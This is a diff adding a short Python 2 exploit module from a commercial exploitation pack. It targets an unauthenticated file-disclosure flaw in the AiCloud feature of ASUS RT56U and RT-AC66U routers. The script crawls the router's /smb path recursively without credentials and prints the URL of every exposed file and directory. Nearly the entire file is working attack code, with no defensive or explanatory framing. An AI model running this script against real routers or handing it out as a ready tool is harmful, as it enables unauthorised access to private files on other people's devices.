@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+###
+# STD modules
+###
+import os, sys
+import cStringIO
+try:
+  import urllib2
+  from bs4 import BeautifulSoup
+except Exception, e:
+  print 'Error: %s'%e
+
+_name_   = 'd2sec_asus_2'
+_vendor_ = 'asus'
+_model_  = ['RT56U', 'RT-AC66U']
+_vuln_   = 'AiCloud Unauthenticated File Disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host, path):
+  try:
+    html_page = urllib2.urlopen('https://%s%s'%(host, path))
+  except urllib2.HTTPError as e:
+    print '[-] error : %s' % e
+    return
+  soup = BeautifulSoup(html_page)
+  for link in soup.findAll('a'):
+    path = link.get('uhref')
+    if path != '../':
+      is_dir = link.get('isdir')
+      if  is_dir == str('1'):
+        print '[!] https://%s%s'%(host,path)
+        pwnrouter(host,path)
+      else:
+        print '[!] https://%s%s'%(host,path)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], '/smb')
+
